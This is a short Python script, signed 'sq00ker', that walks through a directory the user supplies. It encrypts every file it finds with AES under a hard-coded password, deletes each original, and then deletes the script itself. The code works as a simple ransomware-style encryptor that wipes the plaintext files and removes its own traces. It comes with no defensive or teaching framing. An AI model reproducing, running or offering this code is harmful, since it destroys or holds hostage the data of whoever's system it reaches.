# version 1.0
# by sq00ker 

import pyAesCrypt
import os
import sys
from random import choice

# def generate_passwd():
    # alphabet = "1234567890qwertyuiopasdfghjklzxcvbnm!@#$%&*^?"
    # passwd = ""

    # for _ in range(1, 25):
      #  passwd += choice(alphabet)
    # return passwd

def crypt_file(file):
    passwd = "06dweq$1-gr3$?50w-rtyi0!@z"
    buffL = 64 * 1024
    pyAesCrypt.encryptFile(file, f"{file}.aes", passwd, buffL)
    os.remove(file) 

def direct(dir):
    for x in os.listdir(dir):
        name = os.path.join(dir, x)

        if os.path.isfile(name):
            crypt_file(name)
        else:
            direct(name)

dir_path = input(": ")
direct(dir_path) 
os.remove(sys.argv[0])
